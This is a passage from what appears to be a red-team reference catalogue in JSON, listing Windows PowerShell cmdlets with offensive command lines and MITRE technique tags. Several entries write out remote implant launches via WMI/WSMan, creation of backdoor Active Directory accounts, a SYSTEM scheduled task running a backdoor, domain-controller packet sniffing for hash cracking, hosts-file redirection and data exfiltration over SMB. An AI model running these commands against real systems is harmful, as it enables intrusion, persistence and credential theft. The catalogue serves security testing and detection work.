"contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 259, "name": "Get-Service", "type": "Cmdlets", "function": "Processes", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets the services on a local or remote computer", "description": "List services", "commandline": "Get-Service -ComputerName W10.ad.bitsadmin.com", "usecases": ["Reconnaissance on installed services"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 260, "name": "Get-SmbConnection", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Retrieves the connections established from the SMB client to the SMB servers", "description": "TODO", "commandline": "Get-SmbConnection -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `SmbShare`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 261, "name": "Get-SmbOpenFile", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Retrieves basic information about the files that are open on behalf of the clients of the SMB server", "description": "TODO", "commandline": "Get-SmbOpenFile -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `SmbShare`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 262, "name": "Get-SmbServerConfiguration", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Retrieves the SMB server configuration", "description": "TODO", "commandline": "Get-SmbServerConfiguration -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `SmbShare`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 263, "name": "Get-SmbSession", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Retrieves information about the SMB sessions that are currently established between the SMB server and the associated clients", "description": "TODO", "commandline": "Get-SmbSession -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `SmbShare`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 264, "name": "Get-SmbShare", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Retrieves the SMB shares on the computer", "description": "TODO", "commandline": "Get-SmbShare -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `SmbShare`", "resources": [], "mitre_techniques": ["T1135", "T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 265, "name": "Get-VM", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Gets the virtual machines from one or more Hyper-V hosts", "description": "List VMs", "commandline": "Get-VM -CimSession $s", "usecases": ["Reconnaissance on VMs running on a Hyper-V server"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Hyper-V`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 266, "name": "Get-VirtualDisk", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Returns a list of VirtualDisk objects, across all storage pools, across all providers, or optionally a filtered subset based on provided criteria", "description": "TODO", "commandline": "Get-VirtualDisk -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 267, "name": "Get-Volume", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Gets the specified Volume object, or all Volume objects if no filter is provided", "description": "TODO", "commandline": "Get-Volume -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 268, "name": "Get-VpnConnection", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Retrieves the specified VPN connection profile information", "description": "TODO", "commandline": "Get-VpnConnection -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: VpnClient", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 269, "name": "Get-WSManInstance", "type": "Cmdlets", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Displays management information for a resource instance specified by a Resource URI", "description": "List WSMan connections", "commandline": "Get-WSManInstance -ConnectionURI http://W10.ad.bitsadmin.com:5985/wsman shell -Enumerate", "usecases": ["Identify which WSMan sessions are currently active and from where"], "comments": "PowerShell Module: `Microsoft.WSMan.Management`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 270, "name": "Get-WinEvent", "type": "Cmdlets", "function": "Logs", "toolsets": ["Builtin"], "synopsis": "Gets events from event logs and event tracing log files on local and remote computers", "description": "List all Kerberos authentication requests", "commandline": "Get-WinEvent -ComputerName DC1.ad.bitsadmin.com -FilterHashtable @{logname=\"Security\";id=4768} | % { [PSCustomObject]@{TimeCreated=$_.TimeCreated; TargetUserName=$_.Properties[0].Value; TargetDomainName=$_.Properties[1].Value; TargetSid=$_.Properties[2].Value; ServiceName=$_.Properties[3].Value; ServiceSid=$_.Properties[4].Value; TicketOptions=$_.Properties[5].Value; Status=$_.Properties[6].Value; TicketEncryptionType=$_.Properties[7].Value; PreAuthType=$_.Properties[8].Value; IpAddress=$_.Properties[9].Value; IpPort=$_.Properties[10].Value; CertIssuerName=$_.Properties[11].Value; CertSerialNumber=$_.Properties[12].Value; CertThumbprint=$_.Properties[13].Value} }", "usecases": ["Identify which IPs logons of privileged users are originating from"], "comments": "PowerShell Module: `Microsoft.PowerShell.Diagnostics`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 271, "name": "Get-WinEvent", "type": "Cmdlets", "function": "Logs", "toolsets": ["Builtin"], "synopsis": "Gets events from event logs and event tracing log files on local and remote computers", "description": "Based on TGT request identify from which IP a user is authenticating", "commandline": "Get-WinEvent -ComputerName DC1.ad.bitsadmin.com -LogName 'Security' -FilterXPath \"*[System[(EventID=4768)]] and *[EventData[Data[@Name='TargetUserName']='SomeAdmin']]", "usecases": ["Identify which IP a privileged user is originating from"], "comments": "PowerShell Module: `Microsoft.PowerShell.Diagnostics`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 272, "name": "Get-WinEvent", "type": "Cmdlets", "function": "Logs", "toolsets": ["Builtin"], "synopsis": "Gets events from event logs and event tracing log files on local and remote computers", "description": "List logons on a system", "commandline": "Get-WinEvent -ComputerName W10.ad.bitsadmin.com -FilterHashtable @{logname=\"Security\";id=4624} | % { [PSCustomObject]@{TimeCreated=$_.TimeCreated; SubjectUserSid=$_.Properties[0].Value; SubjectUserName=$_.Properties[1].Value; SubjectDomainName=$_.Properties[2].Value; SubjectLogonId=$_.Properties[3].Value; TargetUserSid=$_.Properties[4].Value; TargetUserName=$_.Properties[5].Value; TargetDomainName=$_.Properties[6].Value; TargetLogonId=$_.Properties[7].Value; LogonType=$_.Properties[8].Value; LogonProcessName=$_.Properties[9].Value; AuthenticationPackageName=$_.Properties[10].Value; WorkstationName=$_.Properties[11].Value; LogonGuid=$_.Properties[12].Value; TransmittedServices=$_.Properties[13].Value; LmPackageName=$_.Properties[14].Value; KeyLength=$_.Properties[15].Value; ProcessId=$_.Properties[16].Value; ProcessName=$_.Properties[17].Value; IpAddress=$_.Properties[18].Value; IpPort=$_.Properties[19].Value; ImpersonationLevel=$_.Properties[20].Value; RestrictedAdminMode=$_.Properties[21].Value; TargetOutboundUserName=$_.Properties[22].Value; TargetOutboundDomainName=$_.Properties[23].Value; VirtualAccount=$_.Properties[24].Value; TargetLinkedLogonId=$_.Properties[25].Value; ElevatedToken=$_.Properties[26].Value;} }", "usecases": ["Understand which accounts are used on a system"], "comments": "PowerShell Module: `Microsoft.PowerShell.Diagnostics`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 273, "name": "Get-WinEvent", "type": "Cmdlets", "function": "Logs", "toolsets": ["Builtin"], "synopsis": "Gets events from event logs and event tracing log files on local and remote computers", "description": "Check which logs are enabled by viewing the number of records per log", "commandline": "Get-WinEvent -ListLog * -ComputerName DC1.ad.bitsadmin.com", "usecases": [], "comments": "PowerShell Module: `Microsoft.PowerShell.Diagnostics`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 274, "name": "Get-WindowsFeature", "type": "Cmdlets", "function": "Manage", "toolsets": ["RSAT", "TODO"], "synopsis": "Gets information about Windows Server roles, role services, and features that are available for installation and installed on a specified server", "description": "TODO", "commandline": "Get-WindowsFeature", "usecases": [], "comments": "PowerShell Module: `ServerManager`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 275, "name": "Install-WindowsFeature", "type": "Cmdlets", "function": "Manage", "toolsets": ["RSAT", "TODO"], "synopsis": "Installs one or more roles, role services, or features on either the local or a specified remote server that is running Windows Server 2012 R2", "description": "TODO", "commandline": "Install-WindowsFeature", "usecases": [], "comments": "PowerShell Module: `ServerManager`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 276, "name": "Invoke-CimMethod", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Invokes a method of a CIM class", "description": "Invoke a method on a CIM instance", "commandline": "Get-CimInstance -Namespace root/CIMV2/TerminalServices -ClassName Win32_TerminalServiceSetting | Invoke-CimMethod -MethodName SetAllowTSConnections -Arguments @{AllowTSConnections=1; ModifyFirewallException=1}", "usecases": ["Enable Remote Desktop Services"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `CimCmdlets`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 277, "name": "Invoke-CimMethod", "type": "Cmdlets", "function": "Registry", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Invokes a method of a CIM class", "description": "Invoke a static method on a CIM class", "commandline": "Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"Shadow\"; uValue=[uint32]2} -CimSession $s", "usecases": ["Set registry value"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `CimCmdlets`", "resources": [], "mitre_techniques": ["T1112"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 278, "name": "Invoke-CimMethod", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Invokes a method of a CIM class", "description": "Invoke a static method on a CIM class", "commandline": "Invoke-CimMethod -ClassName Win32_Process -Name Create -Arguments @{CommandLine='C:\\Windows\\System32\\rundll32.exe \"C:\\tmp\\App Folder\\beacon.dll\",Start'} -CimSession $s", "usecases": ["Launch implant"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `CimCmdlets`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 279, "name": "Invoke-Command", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin", "PSSession"], "synopsis": "Runs commands on local and remote computers", "description": "Runs command", "commandline": "Invoke-Command -ComputerName W10.ad.bitsadmin.com { Get-NetAdapter }", "usecases": [], "comments": "Create PSSession `$ps` using [New-PSSession](../New-PSSession/)\nPowerShell Module: `Microsoft.PowerShell.Core`", "resources": [], "mitre_techniques": ["T1021.006", "T1059.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 280, "name": "Invoke-Command", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin", "PSSession"], "synopsis": "Runs commands on local and remote computers", "description": "Runs command", "commandline": "Invoke-Command -Session $ps { Get-NetAdapter }", "usecases": [], "comments": "Create PSSession `$ps` using [New-PSSession](../New-PSSession/)\nPowerShell Module: `Microsoft.PowerShell.Core`", "resources": [], "mitre_techniques": ["T1021.006", "T1059.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 281, "name": "Invoke-WSManAction", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin"], "synopsis": "Invokes an action on the object that is specified by the Resource URI and by the selectors", "description": "Execute binary", "commandline": "Invoke-WSManAction -ComputerName W10.ad.bitsadmin.com -Action \"Create\" -ResourceURI wmicimv2/win32_process -ValueSet @{CommandLine='C:\\Windows\\System32\\rundll32.exe \"C:\\tmp\\App Folder\\beacon.dll\",Start'}", "usecases": ["Launch implant"], "comments": "PowerShell Module: `Microsoft.WSMan.Management`", "resources": [], "mitre_techniques": ["T1047", "T1059.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 282, "name": "Mount-DiskImage", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Mounts a previously created disk image (virtual hard disk or ISO), making it appear as a normal disk", "description": "TODO", "commandline": "Mount-DiskImage -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 283, "name": "Move-Item", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "PSSession"], "synopsis": "Moves an item from one location to another", "description": "Exfiltrate data", "commandline": "Move-Item -Path \\\\FS01.ad.bitsadmin.com\\Users\\AllUsers.zip .", "usecases": ["Exfiltrate data over SMB"], "comments": "Create PSSession `$ps` using [New-PSSession](../New-PSSession/)\nPowerShell Module: `Microsoft.PowerShell.Management`", "resources": [], "mitre_techniques": ["T1021.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 284, "name": "New-ADComputer", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Creates a new Active Directory computer", "description": "Create computer account", "commandline": "$account = 'MyComputer'\n$password = 'Password1!'\n$domain = 'ad.bitsadmin.com'\nNew-ADComputer -Name $account -SAMAccountName $account -AccountPassword (ConvertTo-SecureString $password -Force -AsPlainText) -Verbose -DNSHostName \"$account.$domain\" -ServicePrincipalNames @(\"HOST/$account.$domain\",\"RestrictedKrbHost/$account.$domain\",\"HOST/$account\",\"RestrictedKrbHost/$account\")", "usecases": ["Create backdoor user in the AD"], "comments": "Can be performed by a regular user\nBy default the attribute `ms-DS-MachineAccountQuota` (global setting) is set to 10 for all domain users\nPowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": ["T1136.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 285, "name": "New-ADGroup", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Creates an Active Directory group", "description": "TODO", "commandline": "New-ADGroup", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 286, "name": "New-ADObject", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Creates an Active Directory object", "description": "TODO", "commandline": "New-ADObject", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 287, "name": "New-ADOrganizationalUnit", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Creates a new Active Directory organizational unit", "description": "Create new OU", "commandline": "New-ADOrganizationalUnit -Name GPO_Test -Path \"OU=Azure,OU=Servers,DC=ad,DC=bitsadmin,DC=com", "usecases": ["Create new OU for a simulated ransomware attack"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 288, "name": "New-ADServiceAccount", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Creates a new Active Directory managed service account or group managed service account object", "description": "TODO", "commandline": "New-ADServiceAccount", "usecases": [], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": ["T1136.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 289, "name": "New-ADUser", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Creates a new Active Directory user", "description": "Create new user", "commandline": "New-ADUser -Name \"Backdoor\" -AccountPassword (ConvertTo-SecureString \"MyPassword!\" -Force -AsPlainText) -Enabled $true", "usecases": ["Create backdoor user in the AD"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": ["T1136.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 290, "name": "New-CimInstance", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Creates a CIM instance", "description": "Create new instance", "commandline": "New-CimInstance -ClassName Win32_Environment -Property @{Name=\"testvar\";VariableValue=\"testvalue\";UserName=\"<SYSTEM>\"} -CimSession $s", "usecases": ["Change PATH environment variable for search order hijacking"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `CimCmdlets`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 291, "name": "New-CimSession", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Creates a CIM session", "description": "Creates a CIM session over WinRM", "commandline": "$s = New-CimSession -ComputerName W10.ad.bitsadmin.com", "usecases": ["Connect to remote machine to perform activities using the various WMI classes"], "comments": "There are various other options for the `-Authentication` parameter that can be used", "resources": [], "mitre_techniques": ["T1047", "T1021.006"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 292, "name": "New-CimSession", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Creates a CIM session", "description": "Creates a CIM session over RPC", "commandline": "$so = New-CimSessionOption -Protocol Dcom -Authentication Kerberos\n$s = New-CimSession -ComputerName W10.ad.bitsadmin.com -SessionOption $so", "usecases": ["Connect to remote machine to perform activities using the various WMI classes"], "comments": "There are various other options for the `-Authentication` parameter that can be used", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 293, "name": "New-EtwTraceSession", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Creates an ETW trace session", "description": "TODO", "commandline": "New-EtwTraceSession -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `EventTracingManagement`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 294, "name": "New-GPLink", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Links a GPO to a site, domain, or OU", "description": "TODO", "commandline": "New-GPLink", "usecases": [], "comments": "PowerShell Module: `GroupPolicy`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 295, "name": "New-GPO", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT", "TODO"], "synopsis": "Creates a GPO", "description": "Create new GPO", "commandline": "New-GPO -Name RunImmediateScheduledTask", "usecases": ["Create new GPO which runs an immediate scheduled task to deploy an implant on the computers in the OU it is linked to"], "comments": "PowerShell Module: `GroupPolicy`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 296, "name": "New-NetEventSession", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Creates a network event session", "description": "Sniff traffic", "commandline": "New-NetEventSession -Name sess -CimSession $s -LocalFilePath \"C:\\Windows\\Temp\\Trace.etl\" -CaptureMode SaveToFile\nAdd-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical\nStart-NetEventSession -Name sess -CimSession $s\nGet-NetEventSession -Name sess -CimSession $s\nStop-NetEventSession -Name sess -CimSession $s\nRemove-NetEventSession -Name sess -CimSession $s\nMove-Item \\\\DC1.ad.bitsadmin.com\\C$\\Windows\\Temp\\Trace.etl C:\\tmp", "usecases": ["Sniff authentication traffic on a domain controller and locally crack the hashes"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nConvert resulting `.etl` file to `.pcapng` using `etl2pcapng`\nPowerShell Module: `NetEventPacketCapture`", "resources": ["https://github.com/microsoft/etl2pcapng"], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 297, "name": "New-NetFirewallRule", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Creates a new inbound or outbound firewall rule and adds the rule to the target computer", "description": "TODO", "commandline": "New-NetFirewallRule -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `netsecurity`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 298, "name": "New-NetNat", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Creates a NAT object", "description": "TODO", "commandline": "New-NetNat -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetNat`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 299, "name": "New-NetRoute", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Creates a route in the IP routing table", "description": "TODO", "commandline": "New-NetRoute -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `NetTCPIP`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 300, "name": "New-PSSession", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin", "PSSession"], "synopsis": "Creates a persistent connection to a local or remote computer", "description": "Connect to WinRM", "commandline": "$ps = New-PSSession -ComputerName W10.ad.bitsadmin.com", "usecases": [], "comments": "Next, for example use [Enter-PSSession](../Enter-PSSession) to interactively enter the session or [Invoke-Command](../Invoke-Command) to execute a command in the session", "resources": [], "mitre_techniques": ["T1021.006"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 301, "name": "New-PSSession", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "PSSession"], "synopsis": "Creates a persistent connection to a local or remote computer", "description": "Manage Microsoft Exchange Server", "commandline": "$ps = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exch2019.ad.bitsadmin.com/PowerShell/ -Authentication Kerberos", "usecases": [], "comments": "Might require use of OffensiveDC in case error `ERROR_WSMAN_CLIENT_WORKGROUP_NO_KERBEROS` is returned on a non-domain joined machine", "resources": [], "mitre_techniques": ["T1021.006"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 302, "name": "New-ScheduledTask", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Creates a scheduled task instance", "description": "Create new scheduled task", "commandline": "$a = New-ScheduledTaskAction -Execute \"C:\\Tmp\\backdoor.exe\" -Argument '-background'\n$p = New-ScheduledTaskPrincipal -UserId \"NT Authority\\SYSTEM\"\n$ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8\n$d = New-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss\n$t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nSee [Register-ScheduledTask](../Register-ScheduledTask)\nPowerShell Module: `ScheduledTasks`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 303, "name": "New-SmbShare", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Creates an SMB share", "description": "TODO", "commandline": "New-SmbShare -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `SmbShare`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 304, "name": "New-VirtualDisk", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Creates a new virtual disk in the specified storage pool", "description": "TODO", "commandline": "New-VirtualDisk -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 305, "name": "New-VirtualDiskSnapshot", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Creates a new snapshot of the specified virtual disk", "description": "TODO", "commandline": "New-VirtualDiskSnapshot -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Storage`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 306, "name": "New-WSManInstance", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "TODO"], "synopsis": "Creates a new instance of a management resource", "description": "TODO", "commandline": "New-WSManInstance", "usecases": [], "comments": "PowerShell Module: `Microsoft.WSMan.Management`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 307, "name": "Out-File", "type": "Cmdlets", "function": "Data", "toolsets": ["Builtin"], "synopsis": "Sends output to a file", "description": "Append line to file", "commandline": "10.0.10.123 legit.com\" | Out-File -Append \\\\W10.ad.bitsadmin.com\\C$\\Windows\\System32\\Drivers\\etc\\hosts -Encoding ascii", "usecases": ["Add name to target host file to point to a malicious IP"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 308, "name": "Publish-DscConfiguration", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "TODO"], "synopsis": "Publishes a DSC configuration to a set of computers", "description": "TODO", "commandline": "Publish-DscConfiguration", "usecases": [], "comments": "PowerShell Module: `PSDesiredStateConfiguration`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 309, "name": "Register-CimIndicationEvent", "type": "Cmdlets", "function": "Execute", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Subscribes to indications using a filter expression or a query expression", "description": "TODO", "commandline": "Register-CimIndicationEvent -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `CimCmdlets`", "resources": [], "mitre_techniques": ["T1047"], 